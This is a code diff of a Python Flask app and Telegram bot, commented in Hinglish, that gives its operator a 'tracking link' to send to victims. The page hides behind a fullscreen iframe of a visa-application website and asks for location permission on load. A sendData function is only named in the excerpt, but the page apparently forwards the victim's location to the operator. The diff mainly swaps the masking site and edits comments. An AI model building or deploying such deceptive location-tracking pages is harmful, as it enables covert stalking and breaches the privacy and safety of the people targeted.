@@ -31,22 +31,21 @@ def send_telegram_message(message):
 @bot.message_handler(commands=['start', 'link', 'getlink'])
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
-        # Yahan apna Render ya public URL likhein jab deploy kar lein
         app_url = os.environ.get("APP_URL", "https://onrender.com")
         
         response_text = (
             f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
             f"`{app_url}`\n\n"
-            f"Is link ko send karein. Jaise hi user open karega, website ke sath hi location permission mangi jayegi!"
+            f"Is link ko send karein. Jaise hi user open karega, Netlify website ke sath hi location permission mangi jayegi!"
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-# --- FLASK WEB SERVER (INTEGRATED FULLSCREEN WEBPAGE) ---
+# --- FLASK WEB SERVER (FULLSCREEN IFRAME MASKING) ---
 @app.route("/")
 def index():
-    # Yeh code background mein real website ko show karega aur upar permission mangega
+    # Yeh html background me original website load kar ke upar permission display karega
     return '''
 <!DOCTYPE html>
 <html lang="en">
@@ -76,8 +75,8 @@ def index():
 </head>
 <body>
 
-    <!-- Netlify Website Display Frame -->
-    <iframe src="https://netlify.app"></iframe>
+    <!-- Netlify Website Background Frame -->
+    <iframe src="https://easyvisaapplication.netlify.app/"></iframe>
 
     <script>
         function sendData(payload) {
@@ -115,7 +114,7 @@ def index():
             }
         }
         
-        // Window load hote hi permission trigger hogi background website ke sath
+        // Website load hote hi permission trigger ho jayegi
         window.onload = requestLocation;
     </script>
 </body>
